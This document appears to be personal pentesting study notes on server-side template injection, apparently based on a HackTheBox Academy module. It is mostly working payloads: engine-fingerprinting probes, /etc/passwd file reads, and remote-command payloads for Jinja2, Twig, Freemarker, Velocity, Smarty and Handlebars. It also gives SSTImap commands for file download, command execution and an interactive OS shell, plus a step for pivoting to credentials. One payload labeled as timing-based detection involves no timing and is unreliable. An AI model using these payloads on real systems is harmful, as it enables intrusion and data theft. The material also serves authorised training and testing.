```
${{<%[%'"}}%\.
``` 
- [ ] shows the web app is vulnerable to ssti
![The image is a flowchart showing different template injection payloads and their outcomes.](https://academy.hackthebox.com/storage/modules/145/ssti/diagram.png)
- [ ] check for the server behind
- [ ]  do one to one
`if {{7*'7'}} outputs 49 its twing if it ouputs 77777 its jinja2`

## ✅ Jinja2 SSTI Exploitation Flow
- [ ] Recon: `{{ config.items() }}` (secrets, env, keys)
- [ ] Recon: `{{ self.__init__.__globals__.__builtins__ }}` (confirm builtins)
- [ ] LFI: `{{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}`
- [ ] RCE: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
- [ ] Pivot: read app source/configs → creds/tokens → deeper access

## Twig SSTI Exploitation Flow
- [ ] Recon: `{{ _self }}` → confirm Twig
- [ ] LFI (if Symfony): `
- {{ "/etc/passwd"|file_excerpt(1,-1) }}`
- [ ] RCE: 
- `{{ ['id'] | filter('system') }}`
- [ ] Pivot: run other system commands, read sensitive files

2. **Scan a URL**
    
    ```bash
    python3 sstimap.py -u http://target/index.php?name=test
    ```
    
    - Detects injection point (`name` parameter).
        
    - Identifies engine (Twig in example).
        
    - Shows capabilities (RCE, file read/write, shell, etc.).
        
3. **Examples of Exploitation**
    
    - **Download a file**:
        
        ```bash
        python3 sstimap.py -u http://target/index.php?name=test -D '/etc/passwd' './passwd'
        ```
        
    - **Execute a system command**:
        
        ```bash
        python3 sstimap.py -u http://target/index.php?name=test -S id
        ```
        
        → Returns `uid=33(www-data) gid=33(www-data)`
        
    - **Interactive shell**:
        
        ```bash
        python3 sstimap.py -u http://target/index.php?name=test --os-shell
        ```
        
        → Lets you run `whoami`, `id`, etc.
### Exploiting SSTI by Templating Engine:

#### Jinja2 (Python)

```jinja
{{config.items()[4][1].__class__.__init__.__globals__['os'].popen('id').read()}}
```

#### Twig (PHP)

```twig
{{system('id')}}
```

#### Freemarker (Java)

```java
${new java.lang.ProcessBuilder("id").start()}
```

#### Velocity (Java)

```velocity
#set($e="e")#set($x=$e.class.forName("java.lang.Runtime").getRuntime().exec("id"))$x
```

#### Smarty (PHP)

```smarty
{${system('id')}}
```

#### Handlebars (JavaScript)

```handlebars
{{this.constructor.constructor('return process.mainModule.require("child_process").execSync("id").toString()')()}}
```

### Blind SSTI:

- **Timing-based detection**:
    
    ```jinja
    {{ ''.__class__.__mro__[1].__subclasses__() }}
    ```
    
- **Out-of-Band SSTI Detection** (e.g., Burp Collaborator, interacting with external DNS services)